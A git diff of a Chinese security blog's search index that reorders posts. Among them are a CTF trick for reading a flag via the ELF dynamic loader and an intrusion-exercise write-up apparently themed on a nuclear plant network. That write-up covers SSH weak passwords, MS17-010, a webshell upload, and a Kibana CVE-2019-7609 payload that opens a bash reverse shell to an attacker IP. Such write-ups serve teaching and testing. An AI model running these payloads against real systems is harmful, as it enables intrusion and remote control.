-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220155420455.png" alt="image-20250220155420455"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image-20250220155400083.png" alt="image-20250220155400083"></p>
-<p>su root 获取 root.txt</p>
-]]></content>
-      <categories>
-        <category>htb</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>HackTheBox</tag>
-        <tag>htb-Cat</tag>
       </tags>
   </entry>
   <entry>
@@ -896,89 +896,6 @@
         <tag>web</tag>
         <tag>jwt</tag>
         <tag>json web token</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>linux动态加载</title>
-    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了 shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
-<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
-
-<p>get</p>
-]]></content>
-      <categories>
-        <category>web</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>福清核电-关基测试</title>
-    <url>/2023/07/test-s1rius/</url>
-    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image.png" alt="image-20230713203419117"></p>
-<h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><p>首先 80 端口是一个福清核电的页面<br>没识别到语言 但是有个 apache 可以最后测测</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image1.png" alt="image1"></p>
-<p>先看了看查询下载等功能点 没啥好测的<br>然后发现 static 静态库</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image2.png" alt="image2"></p>
-<p>但是没有敏感文件<br>而且好像是纯静态网页</p>
-<p>看网页的同时 nmap 跑了下端口<br>就 ssh 和 http<br>http 目测没啥利用点（用 xray 跑了下也没东西）<br>猜到 ssh 弱口令<br>fscan 扫出来 root：123456<br>ssh 登录 拿到 flag</p>
-<p>查看网卡 arp 表等信息</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image3.png" alt="image3"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image4.png" alt="image4"></p>
-<p>内网有多台机器<br>上 frp 和 fscan</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image5.png" alt="image5"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image6.png" alt="image6"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image7.png" alt="image7"></p>
-<p>16 存在 ms17010</p>
-<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>msf 攻击<br>需要设置正向 payload、global proxy、rhost</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image8.png" alt="image8"></p>
-<p>查找 flag</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image9.png" alt="image9"></p>
-<p>没有可疑进程<br>但是发现有浏览器<br>抓取到密码<br>ScadaBR 发现是台上位机 通过 tomcat 构建<br>去 tomcat 那台机器看看</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image10.png" alt="image10"></p>
-<h2 id="tomcat-ScadaBR"><a href="#tomcat-ScadaBR" class="headerlink" title="tomcat-ScadaBR"></a>tomcat-ScadaBR</h2><p>根据前面 winserver 获得的信息<br>可以进入 tomcat 的 ScadaBR admin admin<br>通过搜索可找到 CVE-2021-26828<br>版本 0.91 符合利用条件</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image11.png" alt="image11"></p>
-<p>上传哥斯拉 jsp 马</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image12.png" alt="image12"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image13.png" alt="image13"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image14.png" alt="image14"></p>
-<p>LeKxRpwZdJpIjhdc7ECi7994FEXJi2KW<br>tomcat 管理页面被禁用 貌似已无可利用空间</p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image15.png" alt="image15"></p>
-<h2 id="Kibana"><a href="#Kibana" class="headerlink" title="Kibana"></a>Kibana</h2><p>还剩一台主机<br>暴露了一个 yaml<br>扫描其他端口发现 Kibana<br>Version: 6.5.3<br>CVE-2019-7609<br>csdn 上找的几种脚本无法执行<br>可参考 进行修改<br><a href="https://github.com/LandGrey/CVE-2019-7609/blob/master/CVE-2019-7609-kibana-rce.py">CVE-2019-7609&#x2F;CVE-2019-7609-kibana-rce.py at master · LandGrey&#x2F;CVE-2019-7609</a></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="title function_">es</span>().<span class="title function_">props</span>(label.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAAA</span>=<span class="string">&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/10.0.100.202/2233 0&gt;&amp;1\&#x27;&quot;);process.exit()//&#x27;</span>).<span class="title function_">props</span>(label.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require /proc/self/environ&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image16.png" alt="image16"></p>
-<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image18.png" alt="image18"></p>
-]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -1119,6 +1036,116 @@
       </tags>
   </entry>
   <entry>
+    <title>力扣 394.字符串解码 特殊解</title>
+    <url>/2025/02/leetcode%20394/</url>
+    <content><![CDATA[<p><a href="https://leetcode.cn/problems/decode-string">394.字符串解码</a></p>
+<blockquote>
+<p>一种独创的 不用辅助栈的解(笑)</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/1740056281-lJvikC-image.png" alt="lc394-shot"></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>不用栈 遍历字符串转 python 表达式 eval 直出</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>对于 python，我们可用 eval 函数将一串字符串当作 python 语句直接执行</p>
+<p>那么对于四个例子我们可以转换成代码中注释部分的表达式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;3*(&quot;a&quot;) + 2*(&quot;bc&quot;)&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;3*(&quot;a&quot;+2*(&quot;c&quot;))&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;2*(&quot;abc&quot;)+3*(&quot;cd&quot;)+&quot;ef&quot;&#x27;</span>)</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&quot;abc&quot;+3*(&quot;cd&quot;)+&quot;xyz&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="复杂度"><a href="#复杂度" class="headerlink" title="复杂度"></a>复杂度</h2><ul>
+<li>时间复杂度: O(n)</li>
+<li>空间复杂度: O(n)</li>
+</ul>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decodeString</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        func = <span class="string">&#x27;&#x27;</span> <span class="comment"># 用于存表达式</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> s[i].isdigit():</span><br><span class="line">                <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> <span class="keyword">not</span> s[i - <span class="number">1</span>].isdigit():</span><br><span class="line">                    func += <span class="string">&quot;+&quot;</span></span><br><span class="line">                func += s[i]</span><br><span class="line">            <span class="keyword">elif</span> s[i] == <span class="string">&quot;[&quot;</span>:</span><br><span class="line">                func += <span class="string">&quot;*(&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> s[i] == <span class="string">&quot;]&quot;</span>:</span><br><span class="line">                func += <span class="string">&quot;)&quot;</span></span><br><span class="line">                <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(s) - <span class="number">1</span> <span class="keyword">and</span> s[i + <span class="number">1</span>] != <span class="string">&quot;]&quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> s[i + <span class="number">1</span>].isdigit():</span><br><span class="line">                    func += <span class="string">&quot;+&quot;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> i == <span class="number">0</span> <span class="keyword">or</span> <span class="keyword">not</span> s[i - <span class="number">1</span>].isalpha():</span><br><span class="line">                    func += <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">                func += s[i]</span><br><span class="line">                <span class="keyword">if</span> i == <span class="built_in">len</span>(s) - <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> s[i + <span class="number">1</span>].isalpha():</span><br><span class="line">                    func += <span class="string">&#x27;&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(func)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">eval</span>(func)</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>leetcode</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>福清核电-关基测试</title>
+    <url>/2023/07/test-s1rius/</url>
+    <content><![CDATA[<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image.png" alt="image-20230713203419117"></p>
+<h2 id="外网部分"><a href="#外网部分" class="headerlink" title="外网部分"></a>外网部分</h2><p>首先 80 端口是一个福清核电的页面<br>没识别到语言 但是有个 apache 可以最后测测</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image1.png" alt="image1"></p>
+<p>先看了看查询下载等功能点 没啥好测的<br>然后发现 static 静态库</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image2.png" alt="image2"></p>
+<p>但是没有敏感文件<br>而且好像是纯静态网页</p>
+<p>看网页的同时 nmap 跑了下端口<br>就 ssh 和 http<br>http 目测没啥利用点（用 xray 跑了下也没东西）<br>猜到 ssh 弱口令<br>fscan 扫出来 root：123456<br>ssh 登录 拿到 flag</p>
+<p>查看网卡 arp 表等信息</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image3.png" alt="image3"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image4.png" alt="image4"></p>
+<p>内网有多台机器<br>上 frp 和 fscan</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image5.png" alt="image5"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image6.png" alt="image6"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image7.png" alt="image7"></p>
+<p>16 存在 ms17010</p>
+<h2 id="ms17-010"><a href="#ms17-010" class="headerlink" title="ms17-010"></a>ms17-010</h2><p>msf 攻击<br>需要设置正向 payload、global proxy、rhost</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image8.png" alt="image8"></p>
+<p>查找 flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image9.png" alt="image9"></p>
+<p>没有可疑进程<br>但是发现有浏览器<br>抓取到密码<br>ScadaBR 发现是台上位机 通过 tomcat 构建<br>去 tomcat 那台机器看看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image10.png" alt="image10"></p>
+<h2 id="tomcat-ScadaBR"><a href="#tomcat-ScadaBR" class="headerlink" title="tomcat-ScadaBR"></a>tomcat-ScadaBR</h2><p>根据前面 winserver 获得的信息<br>可以进入 tomcat 的 ScadaBR admin admin<br>通过搜索可找到 CVE-2021-26828<br>版本 0.91 符合利用条件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image11.png" alt="image11"></p>
+<p>上传哥斯拉 jsp 马</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image12.png" alt="image12"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image13.png" alt="image13"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image14.png" alt="image14"></p>
+<p>LeKxRpwZdJpIjhdc7ECi7994FEXJi2KW<br>tomcat 管理页面被禁用 貌似已无可利用空间</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image15.png" alt="image15"></p>
+<h2 id="Kibana"><a href="#Kibana" class="headerlink" title="Kibana"></a>Kibana</h2><p>还剩一台主机<br>暴露了一个 yaml<br>扫描其他端口发现 Kibana<br>Version: 6.5.3<br>CVE-2019-7609<br>csdn 上找的几种脚本无法执行<br>可参考 进行修改<br><a href="https://github.com/LandGrey/CVE-2019-7609/blob/master/CVE-2019-7609-kibana-rce.py">CVE-2019-7609&#x2F;CVE-2019-7609-kibana-rce.py at master · LandGrey&#x2F;CVE-2019-7609</a></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="title function_">es</span>().<span class="title function_">props</span>(label.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAAA</span>=<span class="string">&#x27;require(&quot;child_process&quot;).exec(&quot;bash -c \&#x27;bash -i&gt;&amp; /dev/tcp/10.0.100.202/2233 0&gt;&amp;1\&#x27;&quot;);process.exit()//&#x27;</span>).<span class="title function_">props</span>(label.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require /proc/self/environ&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image16.png" alt="image16"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/image18.png" alt="image18"></p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>内网</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>linux动态加载</title>
+    <url>/2022/05/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
+<blockquote>
+<p>都到这一题了权限应该不用讲了</p>
+</blockquote>
+<p>提示给了 shell<br>且不需要提权<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
+<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
+
+<p>get</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AoiAWD反制脚本</title>
     <url>/2024/05/untiAoi/</url>
     <content><![CDATA[<h2 id="AoiAWD-反制脚本"><a href="#AoiAWD-反制脚本" class="headerlink" title="AoiAWD 反制脚本"></a>AoiAWD 反制脚本</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>在经历过 awd 比赛中 AoiAWD 多次崩溃后(长城杯 虽然最后还是进决赛摸鱼了)</p>
@@ -1151,52 +1178,6 @@
         <tag>awd</tag>
         <tag>AoiAWD</tag>
         <tag>反制脚本</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>vue gin合并部署(完美方案)</title>
-    <url>/2024/12/vue%20gin%E5%90%88%E5%B9%B6%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>目前 vue 与 gin 的项目基本都是前后端分离部署</p>
-<p>二者合并部署的教程非常少，且各有各的问题</p>
-<p>结合各个教程后 找到一种比较完美的合并部署方案</p>
-<h2 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h2><p>使用 axios 时进行如下配置</p>
-<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> request = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">`<span class="subst">$&#123;currentDomain&#125;</span>/api`</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123; <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>对 baseURL 进行设置是为了能够使用户请求时，前后端的域名端口完全一致，避免造成跨域（<strong>必须</strong>）</p>
-<p>并且对于非域名部署的情况，能够方便地动态调整，避免写死 baseURL</p>
-<p>headers 的设置是为了 vue dev 环境下，前后端的联调</p>
-<p>同时</p>
-<p>为了 dev 联调避免出现跨域问题，还应添加代理</p>
-<figure class="highlight ts"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="comment">// 其他参数</span></span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="comment">// port: 8080,</span></span><br><span class="line">    <span class="comment">// open: true,</span></span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:5731&quot;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="comment">// rewrite: (path) =&gt; path.replace(/^\/api/, &quot;&quot;), // 移除 /api 前缀 根据前后端代码 自行修改</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<p>额外配置 build 后任务，将构建好的 dist 复制到后端目录下</p>
